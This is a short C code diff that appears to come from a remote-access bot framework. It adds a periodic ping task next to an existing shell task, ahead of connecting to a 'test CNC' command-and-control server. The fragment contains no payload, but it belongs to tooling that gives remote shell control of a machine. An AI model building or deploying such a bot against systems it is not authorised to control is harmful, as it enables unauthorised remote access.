@@ -30,6 +30,7 @@ int main(int argv, char *argc[]) {
         /* init task service */
         laikaT_initTaskService(&tService);
         laikaT_newTask(&tService, 100, shellTask, (void*)bot);
+        laikaT_newTask(&tService, 5000, laikaB_pingTask, (void*)bot);
 
         LAIKA_TRY
             /* connect to test CNC */
